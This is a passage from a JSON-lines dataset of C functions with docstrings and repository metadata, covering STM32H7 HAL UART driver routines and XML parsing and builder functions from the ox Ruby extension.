"HadesFCS/Tests/HADES/HadesTEST_H7/Drivers/STM32H7xx_HAL_Driver/Src/stm32h7xx_hal_uart.c", "commit_date": "2019-12-09 00:00:00", "repo_name": "pms67/HadesFCS", "stars": 672, "license": "bsd-3-clause", "language": "c", "size": 141258}
{"docstring": "/**\n  * @brief TX interrrupt handler for 9 bits data word length and FIFO mode is enabled.\n  * @note   Function is called under interruption only, once\n  *         interruptions have been enabled by HAL_UART_Transmit_IT().\n  * @param huart UART handle.\n  * @retval None\n  */\n", "func_signal": "static void UART_TxISR_16BIT_FIFOEN(UART_HandleTypeDef *huart)", "code": "{\n  uint16_t *tmp;\n  uint16_t  nb_tx_data;\n\n  /* Check that a Tx process is ongoing */\n  if (huart->gState == HAL_UART_STATE_BUSY_TX)\n  {\n    for (nb_tx_data = huart->NbTxDataToProcess ; nb_tx_data > 0U ; nb_tx_data--)\n    {\n      if (huart->TxXferCount == 0U)\n      {\n        /* Disable the TX FIFO threshold interrupt */\n        CLEAR_BIT(huart->Instance->CR3, USART_CR3_TXFTIE);\n\n        /* Enable the UART Transmit Complete Interrupt */\n        SET_BIT(huart->Instance->CR1, USART_CR1_TCIE);\n\n        break; /* force exit loop */\n      }\n      else if (READ_BIT(huart->Instance->ISR, USART_ISR_TXE_TXFNF) != 0U)\n      {\n        tmp = (uint16_t *) huart->pTxBuffPtr;\n        huart->Instance->TDR = (((uint32_t)(*tmp)) & 0x01FFUL);\n        huart->pTxBuffPtr += 2U;\n        huart->TxXferCount--;\n      }\n      else\n      {\n        /* Nothing to do */\n      }\n    }\n  }\n}", "path": "HadesFCS/Tests/HADES/HadesTEST_H7/Drivers/STM32H7xx_HAL_Driver/Src/stm32h7xx_hal_uart.c", "commit_date": "2019-12-09 00:00:00", "repo_name": "pms67/HadesFCS", "stars": 672, "license": "bsd-3-clause", "language": "c", "size": 141258}
{"docstring": "/**\n  * @brief Send an amount of data in DMA mode.\n  * @note   When UART parity is not enabled (PCE = 0), and Word Length is configured to 9 bits (M1-M0 = 01),\n  *         the sent data is handled as a set of u16. In this case, Size must indicate the number\n  *         of u16 provided through pData.\n  * @param huart UART handle.\n  * @param pData Pointer to data buffer (u8 or u16 data elements).\n  * @param Size  Amount of data elements (u8 or u16) to be sent.\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_UART_Transmit_DMA(UART_HandleTypeDef *huart, uint8_t *pData, uint16_t Size)", "code": "{\n  /* Check that a Tx process is not already ongoing */\n  if (huart->gState == HAL_UART_STATE_READY)\n  {\n    if ((pData == NULL) || (Size == 0U))\n    {\n      return HAL_ERROR;\n    }\n\n    __HAL_LOCK(huart);\n\n    huart->pTxBuffPtr  = pData;\n    huart->TxXferSize  = Size;\n    huart->TxXferCount = Size;\n\n    huart->ErrorCode = HAL_UART_ERROR_NONE;\n    huart->gState = HAL_UART_STATE_BUSY_TX;\n\n    if (huart->hdmatx != NULL)\n    {\n      /* Set the UART DMA transfer complete callback */\n      huart->hdmatx->XferCpltCallback = UART_DMATransmitCplt;\n\n      /* Set the UART DMA Half transfer complete callback */\n      huart->hdmatx->XferHalfCpltCallback = UART_DMATxHalfCplt;\n\n      /* Set the DMA error callback */\n      huart->hdmatx->XferErrorCallback = UART_DMAError;\n\n      /* Set the DMA abort callback */\n      huart->hdmatx->XferAbortCallback = NULL;\n\n      /* Enable the UART transmit DMA channel */\n      if (HAL_DMA_Start_IT(huart->hdmatx, (uint32_t)huart->pTxBuffPtr, (uint32_t)&huart->Instance->TDR, Size) != HAL_OK)\n      {\n        /* Set error code to DMA */\n        huart->ErrorCode = HAL_UART_ERROR_DMA;\n\n        __HAL_UNLOCK(huart);\n\n        /* Restore huart->gState to ready */\n        huart->gState = HAL_UART_STATE_READY;\n\n        return HAL_ERROR;\n      }\n    }\n    /* Clear the TC flag in the ICR register */\n    __HAL_UART_CLEAR_FLAG(huart, UART_CLEAR_TCF);\n\n    __HAL_UNLOCK(huart);\n\n    /* Enable the DMA transfer for transmit request by setting the DMAT bit\n    in the UART CR3 register */\n    SET_BIT(huart->Instance->CR3, USART_CR3_DMAT);\n\n    return HAL_OK;\n  }\n  else\n  {\n    return HAL_BUSY;\n  }\n}", "path": "HadesFCS/Tests/HADES/HadesTEST_H7/Drivers/STM32H7xx_HAL_Driver/Src/stm32h7xx_hal_uart.c", "commit_date": "2019-12-09 00:00:00", "repo_name": "pms67/HadesFCS", "stars": 672, "license": "bsd-3-clause", "language": "c", "size": 141258}
{"docstring": "/**\n  * @brief  DMA UART Tx communication abort callback, when initiated by user by a call to\n  *         HAL_UART_AbortTransmit_IT API (Abort only Tx transfer)\n  *         (This callback is executed at end of DMA Tx Abort procedure following user abort request,\n  *         and leads to user Tx Abort Complete callback execution).\n  * @param  hdma DMA handle.\n  * @retval None\n  */\n", "func_signal": "static void UART_DMATxOnlyAbortCallback(DMA_HandleTypeDef *hdma)", "code": "{\n  UART_HandleTypeDef *huart = (UART_HandleTypeDef *)(hdma->Parent);\n\n  huart->TxXferCount = 0U;\n\n  /* Flush the whole TX FIFO (if needed) */\n  if (huart->FifoMode == UART_FIFOMODE_ENABLE)\n  {\n    __HAL_UART_SEND_REQ(huart, UART_TXDATA_FLUSH_REQUEST);\n  }\n\n  /* Restore huart->gState to Ready */\n  huart->gState = HAL_UART_STATE_READY;\n\n  /* Call user Abort complete callback */\n#if (USE_HAL_UART_REGISTER_CALLBACKS == 1)\n  /* Call registered Abort Transmit Complete Callback */\n  huart->AbortTransmitCpltCallback(huart);\n#else\n  /* Call legacy weak Abort Transmit Complete Callback */\n  HAL_UART_AbortTransmitCpltCallback(huart);\n#endif /* USE_HAL_UART_REGISTER_CALLBACKS */\n}", "path": "HadesFCS/Tests/HADES/HadesTEST_H7/Drivers/STM32H7xx_HAL_Driver/Src/stm32h7xx_hal_uart.c", "commit_date": "2019-12-09 00:00:00", "repo_name": "pms67/HadesFCS", "stars": 672, "license": "bsd-3-clause", "language": "c", "size": 141258}
{"docstring": "/**\n  * @brief  Set the RXFIFO threshold.\n  * @param huart      UART handle.\n  * @param Threshold  RX FIFO threshold value\n  *          This parameter can be one of the following values:\n  *            @arg @ref UART_RXFIFO_THRESHOLD_1_8\n  *            @arg @ref UART_RXFIFO_THRESHOLD_1_4\n  *            @arg @ref UART_RXFIFO_THRESHOLD_1_2\n  *            @arg @ref UART_RXFIFO_THRESHOLD_3_4\n  *            @arg @ref UART_RXFIFO_THRESHOLD_7_8\n  *            @arg @ref UART_RXFIFO_THRESHOLD_8_8\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_UARTEx_SetRxFifoThreshold(UART_HandleTypeDef *huart, uint32_t Threshold)", "code": "{\n  uint32_t tmpcr1;\n\n  /* Check the parameters */\n  assert_param(IS_UART_FIFO_INSTANCE(huart->Instance));\n  assert_param(IS_UART_RXFIFO_THRESHOLD(Threshold));\n\n  /* Process Locked */\n  __HAL_LOCK(huart);\n\n  huart->gState = HAL_UART_STATE_BUSY;\n\n  /* Save actual UART configuration */\n  tmpcr1 = READ_REG(huart->Instance->CR1);\n\n  /* Disable UART */\n  __HAL_UART_DISABLE(huart);\n\n  /* Update RX threshold configuration */\n  MODIFY_REG(huart->Instance->CR3, USART_CR3_RXFTCFG, Threshold);\n\n  /* Determine the number of data to process during RX/TX ISR execution */\n  UARTEx_SetNbDataToProcess(huart);\n\n  /* Restore UART configuration */\n  WRITE_REG(huart->Instance->CR1, tmpcr1);\n\n  huart->gState = HAL_UART_STATE_READY;\n\n  /* Process Unlocked */\n  __HAL_UNLOCK(huart);\n\n  return HAL_OK;\n}", "path": "HadesFCS/Tests/HADES/HadesTEST_H7/Drivers/STM32H7xx_HAL_Driver/Src/stm32h7xx_hal_uart_ex.c", "commit_date": "2019-12-09 00:00:00", "repo_name": "pms67/HadesFCS", "stars": 672, "license": "bsd-3-clause", "language": "c", "size": 141258}
{"docstring": "/**\n  * @brief  End ongoing Tx transfer on UART peripheral (following error detection or Transmit completion).\n  * @param  huart UART handle.\n  * @retval None\n  */\n", "func_signal": "static void UART_EndTxTransfer(UART_HandleTypeDef *huart)", "code": "{\n  /* Disable TXEIE, TCIE, TXFT interrupts */\n  CLEAR_BIT(huart->Instance->CR1, (USART_CR1_TXEIE_TXFNFIE | USART_CR1_TCIE));\n  CLEAR_BIT(huart->Instance->CR3, (USART_CR3_TXFTIE));\n\n  /* At end of Tx process, restore huart->gState to Ready */\n  huart->gState = HAL_UART_STATE_READY;\n}", "path": "HadesFCS/Tests/HADES/HadesTEST_H7/Drivers/STM32H7xx_HAL_Driver/Src/stm32h7xx_hal_uart.c", "commit_date": "2019-12-09 00:00:00", "repo_name": "pms67/HadesFCS", "stars": 672, "license": "bsd-3-clause", "language": "c", "size": 141258}
{"docstring": "/**\n  * @brief  Abort ongoing transfers (Interrupt mode).\n  * @param  huart UART handle.\n  * @note   This procedure could be used for aborting any ongoing transfer started in Interrupt or DMA mode.\n  *         This procedure performs following operations :\n  *           - Disable UART Interrupts (Tx and Rx)\n  *           - Disable the DMA transfer in the peripheral register (if enabled)\n  *           - Abort DMA transfer by calling HAL_DMA_Abort_IT (in case of transfer in DMA mode)\n  *           - Set handle State to READY\n  *           - At abort completion, call user abort complete callback\n  * @note   This procedure is executed in Interrupt mode, meaning that abort procedure could be\n  *         considered as completed only when user abort complete callback is executed (not when exiting function).\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_UART_Abort_IT(UART_HandleTypeDef *huart)", "code": "{\n  uint32_t abortcplt = 1U;\n\n  /* Disable interrupts */\n  CLEAR_BIT(huart->Instance->CR1, (USART_CR1_PEIE | USART_CR1_TCIE | USART_CR1_RXNEIE_RXFNEIE | USART_CR1_TXEIE_TXFNFIE));\n  CLEAR_BIT(huart->Instance->CR3, (USART_CR3_EIE | USART_CR3_RXFTIE | USART_CR3_TXFTIE));\n\n  /* If DMA Tx and/or DMA Rx Handles are associated to UART Handle, DMA Abort complete callbacks should be initialised\n     before any call to DMA Abort functions */\n  /* DMA Tx Handle is valid */\n  if (huart->hdmatx != NULL)\n  {\n    /* Set DMA Abort Complete callback if UART DMA Tx request if enabled.\n       Otherwise, set it to NULL */\n    if (HAL_IS_BIT_SET(huart->Instance->CR3, USART_CR3_DMAT))\n    {\n      huart->hdmatx->XferAbortCallback = UART_DMATxAbortCallback;\n    }\n    else\n    {\n      huart->hdmatx->XferAbortCallback = NULL;\n    }\n  }\n  /* DMA Rx Handle is valid */\n  if (huart->hdmarx != NULL)\n  {\n    /* Set DMA Abort Complete callback if UART DMA Rx request if enabled.\n       Otherwise, set it to NULL */\n    if (HAL_IS_BIT_SET(huart->Instance->CR3, USART_CR3_DMAR))\n    {\n      huart->hdmarx->XferAbortCallback = UART_DMARxAbortCallback;\n    }\n    else\n    {\n      huart->hdmarx->XferAbortCallback = NULL;\n    }\n  }\n\n  /* Disable the UART DMA Tx request if enabled */\n  if (HAL_IS_BIT_SET(huart->Instance->CR3, USART_CR3_DMAT))\n  {\n    /* Disable DMA Tx at UART level */\n    CLEAR_BIT(huart->Instance->CR3, USART_CR3_DMAT);\n\n    /* Abort the UART DMA Tx channel : use non blocking DMA Abort API (callback) */\n    if (huart->hdmatx != NULL)\n    {\n      /* UART Tx DMA Abort callback has already been initialised :\n         will lead to call HAL_UART_AbortCpltCallback() at end of DMA abort procedure */\n\n      /* Abort DMA TX */\n      if (HAL_DMA_Abort_IT(huart->hdmatx) != HAL_OK)\n      {\n        huart->hdmatx->XferAbortCallback = NULL;\n      }\n      else\n      {\n        abortcplt = 0U;\n      }\n    }\n  }\n\n  /* Disable the UART DMA Rx request if enabled */\n  if (HAL_IS_BIT_SET(huart->Instance->CR3, USART_CR3_DMAR))\n  {\n    CLEAR_BIT(huart->Instance->CR3, USART_CR3_DMAR);\n\n    /* Abort the UART DMA Rx channel : use non blocking DMA Abort API (callback) */\n    if (huart->hdmarx != NULL)\n    {\n      /* UART Rx DMA Abort callback has already been initialised :\n         will lead to call HAL_UART_AbortCpltCallback() at end of DMA abort procedure */\n\n      /* Abort DMA RX */\n      if (HAL_DMA_Abort_IT(huart->hdmarx) != HAL_OK)\n      {\n        huart->hdmarx->XferAbortCallback = NULL;\n        abortcplt = 1U;\n      }\n      else\n      {\n        abortcplt = 0U;\n      }\n    }\n  }\n\n  /* if no DMA abort complete callback execution is required => call user Abort Complete callback */\n  if (abortcplt == 1U)\n  {\n    /* Reset Tx and Rx transfer counters */\n    huart->TxXferCount = 0U;\n    huart->RxXferCount = 0U;\n\n    /* Clear ISR function pointers */\n    huart->RxISR = NULL;\n    huart->TxISR = NULL;\n\n    /* Reset errorCode */\n    huart->ErrorCode = HAL_UART_ERROR_NONE;\n\n    /* Clear the Error flags in the ICR register */\n    __HAL_UART_CLEAR_FLAG(huart, UART_CLEAR_OREF | UART_CLEAR_NEF | UART_CLEAR_PEF | UART_CLEAR_FEF);\n\n    /* Flush the whole TX FIFO (if needed) */\n    if (huart->FifoMode == UART_FIFOMODE_ENABLE)\n    {\n      __HAL_UART_SEND_REQ(huart, UART_TXDATA_FLUSH_REQUEST);\n    }\n\n    /* Discard the received data */\n    __HAL_UART_SEND_REQ(huart, UART_RXDATA_FLUSH_REQUEST);\n\n    /* Restore huart->gState and huart->RxState to Ready */\n    huart->gState  = HAL_UART_STATE_READY;\n    huart->RxState = HAL_UART_STATE_READY;\n\n    /* As no DMA to be aborted, call directly user Abort complete callback */\n#if (USE_HAL_UART_REGISTER_CALLBACKS == 1)\n    /* Call registered Abort complete callback */\n    huart->AbortCpltCallback(huart);\n#else\n    /* Call legacy weak Abort complete callback */\n    HAL_UART_AbortCpltCallback(huart);\n#endif /* USE_HAL_UART_REGISTER_CALLBACKS */\n  }\n\n  return HAL_OK;\n}", "path": "HadesFCS/Tests/HADES/HadesTEST_H7/Drivers/STM32H7xx_HAL_Driver/Src/stm32h7xx_hal_uart.c", "commit_date": "2019-12-09 00:00:00", "repo_name": "pms67/HadesFCS", "stars": 672, "license": "bsd-3-clause", "language": "c", "size": 141258}
{"docstring": "/**\n  * @brief Set Wakeup from Stop mode interrupt flag selection.\n  * @note It is the application responsibility to enable the interrupt used as\n  *       usart_wkup interrupt source before entering low-power mode.\n  * @param huart           UART handle.\n  * @param WakeUpSelection Address match, Start Bit detection or RXNE/RXFNE bit status.\n  *          This parameter can be one of the following values:\n  *          @arg @ref UART_WAKEUP_ON_ADDRESS\n  *          @arg @ref UART_WAKEUP_ON_STARTBIT\n  *          @arg @ref UART_WAKEUP_ON_READDATA_NONEMPTY\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_UARTEx_StopModeWakeUpSourceConfig(UART_HandleTypeDef *huart, UART_WakeUpTypeDef WakeUpSelection)", "code": "{\n  HAL_StatusTypeDef status = HAL_OK;\n  uint32_t tickstart;\n\n  /* check the wake-up from stop mode UART instance */\n  assert_param(IS_UART_WAKEUP_FROMSTOP_INSTANCE(huart->Instance));\n  /* check the wake-up selection parameter */\n  assert_param(IS_UART_WAKEUP_SELECTION(WakeUpSelection.WakeUpEvent));\n\n  /* Process Locked */\n  __HAL_LOCK(huart);\n\n  huart->gState = HAL_UART_STATE_BUSY;\n\n  /* Disable the Peripheral */\n  __HAL_UART_DISABLE(huart);\n\n  /* Set the wake-up selection scheme */\n  MODIFY_REG(huart->Instance->CR3, USART_CR3_WUS, WakeUpSelection.WakeUpEvent);\n\n  if (WakeUpSelection.WakeUpEvent == UART_WAKEUP_ON_ADDRESS)\n  {\n    UARTEx_Wakeup_AddressConfig(huart, WakeUpSelection);\n  }\n\n  /* Enable the Peripheral */\n  __HAL_UART_ENABLE(huart);\n\n  /* Init tickstart for timeout managment*/\n  tickstart = HAL_GetTick();\n\n  /* Wait until REACK flag is set */\n  if (UART_WaitOnFlagUntilTimeout(huart, USART_ISR_REACK, RESET, tickstart, HAL_UART_TIMEOUT_VALUE) != HAL_OK)\n  {\n    status = HAL_TIMEOUT;\n  }\n  else\n  {\n    /* Initialize the UART State */\n    huart->gState = HAL_UART_STATE_READY;\n  }\n\n  /* Process Unlocked */\n  __HAL_UNLOCK(huart);\n\n  return status;\n}", "path": "HadesFCS/Tests/HADES/HadesTEST_H7/Drivers/STM32H7xx_HAL_Driver/Src/stm32h7xx_hal_uart_ex.c", "commit_date": "2019-12-09 00:00:00", "repo_name": "pms67/HadesFCS", "stars": 672, "license": "bsd-3-clause", "language": "c", "size": 141258}
{"docstring": "/**\n  * @brief Receive an amount of data in blocking mode.\n  * @note   When UART parity is not enabled (PCE = 0), and Word Length is configured to 9 bits (M1-M0 = 01),\n  *         the received data is handled as a set of u16. In this case, Size must indicate the number\n  *         of u16 available through pData.\n  * @note When FIFO mode is enabled, the RXFNE flag is set as long as the RXFIFO\n  *       is not empty. Read operations from the RDR register are performed when\n  *       RXFNE flag is set. From hardware perspective, RXFNE flag and\n  *       RXNE are mapped on the same bit-field.\n  * @param huart   UART handle.\n  * @param pData   Pointer to data buffer (u8 or u16 data elements).\n  * @param Size    Amount of data elements (u8 or u16) to be received.\n  * @param Timeout Timeout duration.\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_UART_Receive(UART_HandleTypeDef *huart, uint8_t *pData, uint16_t Size, uint32_t Timeout)", "code": "{\n  uint8_t  *pdata8bits;\n  uint16_t *pdata16bits;\n  uint16_t uhMask;\n  uint32_t tickstart;\n\n  /* Check that a Rx process is not already ongoing */\n  if (huart->RxState == HAL_UART_STATE_READY)\n  {\n    if ((pData == NULL) || (Size == 0U))\n    {\n      return  HAL_ERROR;\n    }\n\n    __HAL_LOCK(huart);\n\n    huart->ErrorCode = HAL_UART_ERROR_NONE;\n    huart->RxState = HAL_UART_STATE_BUSY_RX;\n\n    /* Init tickstart for timeout managment*/\n    tickstart = HAL_GetTick();\n\n    huart->RxXferSize  = Size;\n    huart->RxXferCount = Size;\n\n    /* Computation of UART mask to apply to RDR register */\n    UART_MASK_COMPUTATION(huart);\n    uhMask = huart->Mask;\n\n    /* In case of 9bits/No Parity transfer, pRxData needs to be handled as a uint16_t pointer */\n    if ((huart->Init.WordLength == UART_WORDLENGTH_9B) && (huart->Init.Parity == UART_PARITY_NONE))\n    {\n      pdata8bits  = NULL;\n      pdata16bits = (uint16_t *) pData;\n    }\n    else\n    {\n      pdata8bits  = pData;\n      pdata16bits = NULL;\n    }\n\n    /* as long as data have to be received */\n    while (huart->RxXferCount > 0U)\n    {\n      if (UART_WaitOnFlagUntilTimeout(huart, UART_FLAG_RXNE, RESET, tickstart, Timeout) != HAL_OK)\n      {\n        return HAL_TIMEOUT;\n      }\n      if (pdata8bits == NULL)\n      {\n        *pdata16bits = (uint16_t)(huart->Instance->RDR & uhMask);\n        pdata16bits++;\n      }\n      else\n      {\n        *pdata8bits = (uint8_t)(huart->Instance->RDR & (uint8_t)uhMask);\n        pdata8bits++;\n      }\n      huart->RxXferCount--;\n    }\n\n    /* At end of Rx process, restore huart->RxState to Ready */\n    huart->RxState = HAL_UART_STATE_READY;\n\n    __HAL_UNLOCK(huart);\n\n    return HAL_OK;\n  }\n  else\n  {\n    return HAL_BUSY;\n  }\n}", "path": "HadesFCS/Tests/HADES/HadesTEST_H7/Drivers/STM32H7xx_HAL_Driver/Src/stm32h7xx_hal_uart.c", "commit_date": "2019-12-09 00:00:00", "repo_name": "pms67/HadesFCS", "stars": 672, "license": "bsd-3-clause", "language": "c", "size": 141258}
{"docstring": "// Entered after the \"<!DOCTYPE\" sequence plus the first character after\n// that. Ready to read the rest.\n", "func_signal": "static void\nread_doctype(PInfo pi)", "code": "{\n    char\t*docType;\n\n    next_non_white(pi);\n    docType = pi->s;\n    read_delimited(pi, '>');\n    if (err_has(&pi->err)) {\n\treturn;\n    }\n    pi->s--;\n    *pi->s = '\\0';\n    pi->s++;\n    if (0 != pi->pcb->add_doctype) {\n\tpi->pcb->add_doctype(pi, docType);\n    }\n}", "path": "ox/ext/ox/parse.c", "commit_date": "2020-09-03 00:00:00", "repo_name": "ohler55/ox", "stars": 886, "license": "mit", "language": "c", "size": 2429}
{"docstring": "/* Assume the value starts immediately and goes until the quote character is\n * reached again. Do not read the character after the terminating quote.\n */\n", "func_signal": "static char*\nread_quoted_value(PInfo pi)", "code": "{\n    char\t*value = 0;\n\n    if ('\"' == *pi->s || '\\'' == *pi->s) {\n        char\tterm = *pi->s;\n\n        pi->s++;\t/* skip quote character */\n        value = pi->s;\n        for (; *pi->s != term; pi->s++) {\n            if ('\\0' == *pi->s) {\n                set_error(&pi->err, \"invalid format, document not terminated\", pi->str, pi->s);\n\t\treturn 0;\n            }\n        }\n        *pi->s = '\\0';\t/* terminate value */\n        pi->s++;\t/* move past quote */\n    } else if (StrictEffort == pi->options->effort) {\n\tset_error(&pi->err, \"invalid format, expected a quote character\", pi->str, pi->s);\n\treturn 0;\n    } else if (TolerantEffort == pi->options->effort) {\n        value = pi->s;\n        for (; 1; pi->s++) {\n\t    switch (*pi->s) {\n\t    case '\\0':\n                set_error(&pi->err, \"invalid format, document not terminated\", pi->str, pi->s);\n\t\treturn 0;\n\t    case ' ':\n\t    case '/':\n\t    case '>':\n\t    case '?': // for instructions\n\t    case '\\t':\n\t    case '\\n':\n\t    case '\\r':\n\t\tpi->last = *pi->s;\n\t\t*pi->s = '\\0';\t/* terminate value */\n\t\tpi->s++;\n\t\treturn value;\n\t    default:\n\t\tbreak;\n            }\n        }\n    } else {\n        value = pi->s;\n        next_white(pi);\n\tif ('\\0' == *pi->s) {\n\t    set_error(&pi->err, \"invalid format, document not terminated\", pi->str, pi->s);\n\t    return 0;\n        }\n        *pi->s++ = '\\0'; /* terminate value */\n    }\n    return value;\n}", "path": "ox/ext/ox/parse.c", "commit_date": "2020-09-03 00:00:00", "repo_name": "ohler55/ox", "stars": 886, "license": "mit", "language": "c", "size": 2429}
{"docstring": "/* call-seq: element(name,attributes)\n *\n * Adds an element with the name and attributes provided. If a block is given\n * then on closing of the block a pop() is called.\n *\n * - +name+ - (String) name of the element\n * - +attributes+ - (Hash) of the element\n */\n", "func_signal": "static VALUE\nbuilder_element(int argc, VALUE *argv, VALUE self)", "code": "{\n    Builder\t\tb = (Builder)DATA_PTR(self);\n    Element\t\te;\n    const char\t\t*name;\n    long\t\tlen;\n\n    if (1 > argc) {\n\trb_raise(ox_arg_error_class, \"missing element name\");\n    }\n    i_am_a_child(b, false);\n    append_indent(b);\n    b->depth++;\n    if (MAX_DEPTH <= b->depth) {\n\trb_raise(ox_arg_error_class, \"XML too deeply nested\");\n    }\n    switch (rb_type(*argv)) {\n    case T_STRING:\n\tname = StringValuePtr(*argv);\n\tlen = RSTRING_LEN(*argv);\n\tbreak;\n    case T_SYMBOL:\n\tname = rb_id2name(SYM2ID(*argv));\n\tlen = strlen(name);\n\tbreak;\n    default:\n\trb_raise(ox_arg_error_class, \"expected a Symbol or String for an element name\");\n\tbreak;\n    }\n    e = &b->stack[b->depth];\n    if (sizeof(e->buf) <= (size_t)len) {\n\te->name = strdup(name);\n\t*e->buf = '\\0';\n    } else {\n\tstrcpy(e->buf, name);\n\te->name = e->buf;\n    }\n    e->len = len;\n    e->has_child = false;\n    e->non_text_child = false;\n\n    buf_append(&b->buf, '<');\n    b->col++;\n    b->pos++;\n    append_string(b, e->name, len, xml_element_chars, false);\n    if (1 < argc && T_HASH == rb_type(argv[1])) {\n\trb_hash_foreach(argv[1], append_attr, (VALUE)b);\n    }\n    // Do not close with > or /> yet. That is done with i_am_a_child() or pop().\n    if (rb_block_given_p()) {\n\trb_yield(self);\n\tpop(b);\n    }\n    return Qnil;\n}", "path": "ox/ext/ox/builder.c", "commit_date": "2020-09-03 00:00:00", "repo_name": "ohler55/ox", "stars": 886, "license": "mit", "language": "c", "size": 2429}
{"docstring": "/* Document-class: Ox::Sax::Value\n *\n * Values in the SAX callbacks. They can be converted to various different\n * types. with the _as_x()_ methods.\n */\n", "func_signal": "void\nox_sax_define()", "code": "{\n#if 0\n    ox = rb_define_module(\"Ox\");\n    sax_module = rb_define_class_under(ox, \"Sax\", rb_cObject);\n#endif\n    VALUE\tsax_module = rb_const_get_at(Ox, rb_intern(\"Sax\"));\n\n    ox_sax_value_class = rb_define_class_under(sax_module, \"Value\", rb_cObject);\n\n    rb_define_method(ox_sax_value_class, \"as_s\", sax_value_as_s, 0);\n    rb_define_method(ox_sax_value_class, \"as_sym\", sax_value_as_sym, 0);\n    rb_define_method(ox_sax_value_class, \"as_i\", sax_value_as_i, 0);\n    rb_define_method(ox_sax_value_class, \"as_f\", sax_value_as_f, 0);\n    rb_define_method(ox_sax_value_class, \"as_time\", sax_value_as_time, 0);\n    rb_define_method(ox_sax_value_class, \"as_bool\", sax_value_as_bool, 0);\n    rb_define_method(ox_sax_value_class, \"empty?\", sax_value_empty, 0);\n}", "path": "ox/ext/ox/sax_as.c", "commit_date": "2020-09-03 00:00:00", "repo_name": "ohler55/ox", "stars": 886, "license": "mit", "language": "c", "size": 2429}
{"docstring": "/* call-seq: as_i()\n *\n * *return* value as an Fixnum.\n */\n", "func_signal": "static VALUE\nsax_value_as_i(VALUE self)", "code": "{\n    SaxDrive\tdr = DATA_PTR(self);\n    const char\t*s = dr->buf.str;\n    long\tn = 0;\n    int\t\tneg = 0;\n\n    if ('\\0' == *s) {\n\treturn Qnil;\n    }\n    if ('-' == *s) {\n\tneg = 1;\n\ts++;\n    } else if ('+' == *s) {\n\ts++;\n    }\n    for (; '\\0' != *s; s++) {\n\tif ('0' <= *s && *s <= '9') {\n\t    n = n * 10 + (*s - '0');\n\t} else {\n\t    rb_raise(ox_arg_error_class, \"Not a valid Fixnum.\\n\");\n\t}\n    }\n    if (neg) {\n\tn = -n;\n    }\n    return LONG2NUM(n);\n}", "path": "ox/ext/ox/sax_as.c", "commit_date": "2020-09-03 00:00:00", "repo_name": "ohler55/ox", "stars": 886, "license": "mit", "language": "c", "size": 2429}
{"docstring": "/* call-seq: raw(text)\n *\n * Adds the provided string directly to the XML without formatting or modifications.\n *\n * - +text+ - (String) contents to be added\n */\n", "func_signal": "static VALUE\nbuilder_raw(VALUE self, VALUE text)", "code": "{\n    Builder\t\tb = (Builder)DATA_PTR(self);\n    volatile VALUE\tv = text;\n    const char\t\t*str;\n    const char\t\t*s;\n    const char\t\t*end;\n    int\t\t\tlen;\n\n    if (T_STRING != rb_type(v)) {\n\tv = rb_funcall(v, ox_to_s_id, 0);\n    }\n    str = StringValuePtr(v);\n    len = (int)RSTRING_LEN(v);\n    s = str;\n    end = str + len;\n    i_am_a_child(b, true);\n    buf_append_string(&b->buf, str, len);\n    b->col += len;\n    s = strchr(s, '\\n');\n    while (NULL != s) {\n        b->line++;\n        b->col = end - s;\n        s = strchr(s + 1, '\\n');\n    }\n    b->pos += len;\n\n    return Qnil;\n}", "path": "ox/ext/ox/builder.c", "commit_date": "2020-09-03 00:00:00", "repo_name": "ohler55/ox", "stars": 886, "license": "mit", "language": "c", "size": 2429}
{"docstring": "/* call-seq: text(text)\n *\n * Adds a text element to the XML string being formed.\n * - +text+ - (String) contents of the text field\n * - +strip_invalid_chars+ - [true|false] strips any characters invalid for XML, defaults to false\n */\n", "func_signal": "static VALUE\nbuilder_text(int argc, VALUE *argv, VALUE self)", "code": "{\n    Builder\t\tb = (Builder)DATA_PTR(self);\n    volatile VALUE\tv;\n    volatile VALUE\tstrip_invalid_chars;\n\n    if ((0 == argc) || (argc > 2)) {\n\trb_raise(rb_eArgError, \"wrong number of arguments (given %d, expected 1..2)\", argc);\n    }\n    v = argv[0];\n    if (2 == argc) {\n\tstrip_invalid_chars = argv[1];\n    } else {\n\tstrip_invalid_chars = Qfalse;\n    }\n\n    if (T_STRING != rb_type(v)) {\n\tv = rb_funcall(v, ox_to_s_id, 0);\n    }\n    i_am_a_child(b, true);\n    append_string(b, StringValuePtr(v), RSTRING_LEN(v), xml_element_chars, RTEST(strip_invalid_chars));\n\n    return Qnil;\n}", "path": "ox/ext/ox/builder.c", "commit_date": "2020-09-03 00:00:00", "repo_name": "ohler55/ox", "stars": 886, "license": "mit", "language": "c", "size": 2429}
{"docstring": "/* call-seq: as_s()\n *\n * *return* value as an String.\n */\n", "func_signal": "static VALUE\nsax_value_as_s(VALUE self)", "code": "{\n    SaxDrive\tdr = DATA_PTR(self);\n    VALUE\trs;\n\n    if ('\\0' == *dr->buf.str) {\n\treturn Qnil;\n    }\n    if (dr->options.convert_special) {\n\tox_sax_collapse_special(dr, dr->buf.str, dr->buf.pos, dr->buf.line, dr->buf.col);\n    }\n    switch (dr->options.skip) {\n    case CrSkip:\n\tbuf_collapse_return(dr->buf.str);\n\tbreak;\n    case SpcSkip:\n\tbuf_collapse_white(dr->buf.str);\n\tbreak;\n    default:\n\tbreak;\n    }\n    rs = rb_str_new2(dr->buf.str);\n#if HAVE_RB_ENC_ASSOCIATE\n    if (0 != dr->encoding) {\n\trb_enc_associate(rs, dr->encoding);\n    }\n#endif\n    return rs;\n}", "path": "ox/ext/ox/sax_as.c", "commit_date": "2020-09-03 00:00:00", "repo_name": "ohler55/ox", "stars": 886, "license": "mit", "language": "c", "size": 2429}
